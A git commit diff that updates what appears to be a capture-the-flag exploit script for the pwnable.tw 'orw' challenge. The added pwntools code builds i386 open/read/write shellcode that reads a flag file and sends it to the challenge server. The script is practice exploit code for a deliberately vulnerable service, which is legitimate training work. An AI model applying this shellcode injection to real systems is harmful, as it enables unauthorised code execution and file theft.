1ec6397f7e0ab1a1a9bf3b48595edbb45e5097c1
pic4xiu <40382944+pic4xiu@users.noreply.github.com>
2019-04-27 13:59:19 +0800

    Update orw.py

--- exp/orw.py
+++ exp/orw.py
@@ -16,7 +16,15 @@ s.sendline(shellcode)
 flag = s.recv()
 print flag
 '''
-fd = open('/home/orw/flag',0,0)
-write(fd,buffer,0x30)
-read(1,buffer,0x30)
+from pwn import *
+
+p = remote("chall.pwnable.tw", 10001)
+shellcode = ""
+shellcode += shellcraft.i386.pushstr("/home/orw/flag")    
+shellcode += shellcraft.i386.linux.syscall("SYS_open", 'esp')
+shellcode += shellcraft.i386.linux.syscall("SYS_read", 'eax', 'esp', 0x30)
+shellcode += shellcraft.i386.linux.syscall("SYS_write", 1, 'esp', 0x30)
+p.recvuntil(":")
+p.send(asm(shellcode))
+p.interactive()
 '''
